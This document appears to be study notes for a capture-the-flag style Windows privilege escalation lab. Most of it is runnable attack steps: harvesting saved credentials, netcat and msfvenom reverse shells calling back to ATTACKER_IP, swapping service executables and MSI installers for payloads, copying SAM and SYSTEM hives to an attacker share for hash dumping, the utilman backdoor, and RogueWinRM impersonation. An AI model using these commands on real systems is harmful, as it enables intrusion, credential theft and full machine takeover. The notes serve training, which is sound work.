# Windows Privilege Escalation

---

## TASK 3: Harvesting Passwords from Usual Spots

### Unattended Windows Installations
Unattended Windows Installations allow a single operating system image to be deployed to several hosts through the network. Look for the following files:
- `C:\Unattend.xml`
- `C:\Windows\Panther\Unattend.xml`
- `C:\Windows\Panther\Unattend\Unattend.xml`
- `C:\Windows\system32\sysprep.inf`
- `C:\Windows\system32\sysprep\sysprep.xml`

These files might contain credentials:
```xml
<Credentials>
    <Username>Administrator</Username>
    <domain>thm.local</domain>
    <Password>Hello123</Password>
</Credentials>
```

### Command Prompt History
- View command prompt history:
  ```cmd
  type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
  ```

### Saved Credentials
- List saved credentials:
  ```cmd
  cmdkey /list
  ```
- See actual password:
  ```cmd
  runas /savecred /user:admin cmd.exe
  ```

### IIS Configuration
Internet Information Services (IIS) is the default web server on Windows installations. Look for `web.config` files that store passwords for databases or configured authentication mechanisms:
- `C:\inetpub\wwwroot\web.config`
- `C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config`

Find database connection strings:
```cmd
type C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config | findstr connectionString
```

### Retrieve Credentials from Software: PuTTY
PuTTY is an SSH client commonly found on Windows systems. It stores proxy configurations that include cleartext authentication credentials:
```cmd
reg query HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\ /f "Proxy" /s
```

---

## TASK 4: Other Quick Wins

### Scheduled Tasks
- Query scheduled tasks:
  ```cmd
  schtasks /query /tn vulntask /fo list /v
  ```
- Check file permissions on the executable:
  ```cmd
  icacls c:\tasks\schtask.bat
  ```
- If the `BUILTIN\Users` group has full access (F), modify the `.bat` file and insert a payload:
  ```cmd
  echo c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 4444 > C:\tasks\schtask.bat
  ```
- Start a listener on the AttackBox:
  ```cmd
  nc -lvp 1234
  ```
- Manually run the task:
  ```cmd
  schtasks /run /tn vulntask
  ```

### AlwaysInstallElevated
Windows installer (`.msi`) files can be configured to run with elevated privileges. Check the following registry values:
```cmd
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer
```

Generate a malicious `.msi` file from the AttackBox:
```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKING_MACHINE_IP LPORT=LOCAL_PORT -f msi -o malicious.msi
```

Run the `.msi` file on the victim machine:
```cmd
msiexec /quiet /qn /i C:\Windows\Temp\malicious.msi
```

---

## TASK 5: Abusing Service Misconfigurations

### Windows Services
The Service Control Manager (SCM) manages the state of services. Check service configurations:
```cmd
sc qc apphostsvc
```

### Insecure Permissions on Service Executable
If the executable associated with a service has weak permissions, attackers can modify or replace it. Example:
1. Check service configuration:
   ```cmd
   sc qc WindowsScheduler
   ```
2. Check permissions on the executable:
   ```cmd
   icacls C:\Progra~2\System~1\WService.exe
   ```
3. Generate a payload:
   ```bash
   msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=1234 -f exe-service -o rev-svc.exe
   ```
4. Replace the executable:
   ```cmd
   move WService.exe WService.exe.bkp
   move C:\Users\thm-unpriv\rev-svc.exe WService.exe
   icacls WService.exe /grant Everyone:F
   ```
5. Restart the service:
   ```cmd
   sc stop windowsscheduler
   sc start windowsscheduler
   ```

### Unquoted Service Paths
If a service executable path is unquoted, attackers can exploit it by creating executables in earlier paths. Example:
1. Check permissions:
   ```cmd
   icacls c:\MyPrograms
   ```
2. Generate a payload:
   ```bash
   msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=1234 -f exe-service -o rev-svc2.exe
   ```
3. Replace the executable:
   ```cmd
   move C:\Users\thm-unpriv\rev-svc2.exe C:\MyPrograms\Disk.exe
   icacls C:\MyPrograms\Disk.exe /grant Everyone:F
   ```
4. Restart the service:
   ```cmd
   sc stop "disk sorter enterprise"
   sc start "disk sorter enterprise"
   ```

### Insecure Service Permissions
If the service's DACL allows configuration changes, attackers can reconfigure the service to run any executable. Example:
1. Check service DACL:
   ```cmd
   accesschk64.exe -qlc thmservice
   ```
2. Generate a payload:
   ```bash
   msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=1234 -f exe-service -o rev-svc3.exe
   ```
3. Reconfigure the service:
   ```cmd
   sc config THMService binPath= "C:\Users\thm-unpriv\rev-svc3.exe" obj= LocalSystem
   ```
4. Restart the service:
   ```cmd
   sc stop THMService
   sc start THMService
   ```

---

## TASK 6: Abusing Dangerous Privileges

### SeBackup / SeRestore
These privileges allow bypassing DACLs to read/write any file. Example:
1. Check user privileges:
   ```cmd
   whoami /priv
   ```
2. Backup SAM and SYSTEM hashes:
   ```cmd
   reg save hklm\system C:\Users\THMBackup\system.hive
   reg save hklm\sam C:\Users\THMBackup\sam.hive
   ```
3. Copy files to the AttackBox:
   ```cmd
   copy C:\Users\THMBackup\sam.hive \\ATTACKER_IP\public\
   copy C:\Users\THMBackup\system.hive \\ATTACKER_IP\public\
   ```
4. Extract password hashes:
   ```bash
   secretsdump.py -sam sam.hive -system system.hive LOCAL
   ```

### SeTakeOwnership
This privilege allows taking ownership of any object. Example:
1. Take ownership of `utilman.exe`:
   ```cmd
   takeown /f C:\Windows\System32\Utilman.exe
   ```
2. Assign full permissions:
   ```cmd
   icacls C:\Windows\System32\Utilman.exe /grant THMTakeOwnership:F
   ```
3. Replace `utilman.exe` with `cmd.exe`:
   ```cmd
   copy cmd.exe utilman.exe
   ```
4. Trigger `utilman.exe` to gain SYSTEM-level access.

### SeImpersonate / SeAssignPrimaryToken
These privileges allow impersonating other users. Example:
1. Upload `RogueWinRM` to the target.
2. Trigger the exploit:
   ```cmd
   RogueWinRM.exe -p "C:\tools\nc64.exe" -a "-e cmd.exe ATTACKER_IP 4442"
   ```

---

## TASK 7: Abusing Vulnerable Software

### Unpatched Software
Outdated software can provide privilege escalation opportunities. Example:
1. List installed software:
   ```cmd
   wmic product get name,version,vendor
   ```
2. Search for vulnerabilities using exploit-db or CVE databases.

### Case Study: Druva inSync 6.6.3
1. Exploit Druva inSync RPC server:
   ```powershell
   $cmd = "net user pwnd /add"
   $s = New-Object System.Net.Sockets.Socket(...)
   $s.Connect("127.0.0.1", 6064)
   ...
   ```
2. Modify the `$cmd` variable to add an admin user.

---

## TASK 8: Tools of Trade

### WinPEAS
- Run WinPEAS:
  ```cmd
  winpeas.exe > outputfile.txt
  ```

### PrivescCheck
- Run PrivescCheck:
  ```powershell
  Set-ExecutionPolicy Bypass -Scope process -Force
  . .\PrivescCheck.ps1
  Invoke-PrivescCheck
  ```

### WES-NG
- Update WES-NG database:
  ```bash
  wes.py --update
  ```
- Analyze system info:
  ```bash
  wes.py systeminfo.txt
  ```

### Metasploit
- Use Metasploit's local exploit suggester:
  ```bash
  use multi/recon/local_exploit_suggester
  set session 1
  run
  ```

---

## Appendix

### Critical Components
- **SAM**: Contains user account information, including hashed passwords.
- **SYSTEM Hive**: Contains system configuration settings.
- **DACL**: Specifies access permissions for resources.

### Useful Commands
- List installed software:
  ```cmd
  wmic product get name,version,vendor
  ```
- Check user privileges:
  ```cmd
  whoami /priv
  ```